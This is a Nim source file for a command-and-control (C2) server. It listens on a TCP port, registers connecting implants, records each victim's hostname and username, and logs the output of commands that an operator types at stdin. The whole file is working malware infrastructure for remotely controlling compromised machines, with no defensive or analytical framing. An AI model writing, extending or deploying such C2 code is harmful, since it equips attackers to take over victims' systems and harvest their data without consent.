import asyncdispatch, asyncnet, threadpool
import strutils, terminal

import asyncdispatch, asynchttpserver, ws, asyncfutures

import types, logging, cli

infoLog "initializing c2 server"

var server = C2Server(socket: newAsyncSocket(), clients: @[])
var clResp = new (ref Future[void])

proc processMessages(server: C2Server, client: Client) {.async.} =
  while true:
    let line = await client.socket.recvLine()
    
    let args = line.split(":")
    let argsn = len(args)

    if line.len == 0:
      
      cDisconnected(client)
      
      client.connected = false
      client.socket.close()
      return
    if line == "connect":
      await client.socket.send("hi\r\n")
    if line == "pong":
      echo "pong from " & $client
    if line.startsWith("INFO:"):
      server.clients[client.id].loaded = true
      server.clients[client.id].hostname = args[1]
      server.clients[client.id].username = args[2]
    if line.startsWith("OUTPUT:"):
      logClientOutput client, args[1], args[2]
      if not clResp.isNil():
        clResp[].complete()
        clResp[] = nil

proc acceptSocketClients(port = 12345) {.async.} =
  server.socket.bindAddr(port.Port)
  server.socket.listen()
  
  infoLog "listening on localhost:" & intToStr(port)
  
  while true:
    let (netAddr, clientSocket) = await server.socket.acceptAddr()
    
    let client = Client(
      socket: clientSocket,
      netAddr: netAddr,
      id: server.clients.len,
      connected: true,
      loaded: false,
      hostname: "placeholder",
      username: "placeholder"
    )

    cConnected(client)

    server.clients.add(client)
    asyncCheck processMessages(server, client)

asyncCheck procStdin(server, clResp)
asyncCheck acceptSocketClients()

runForever()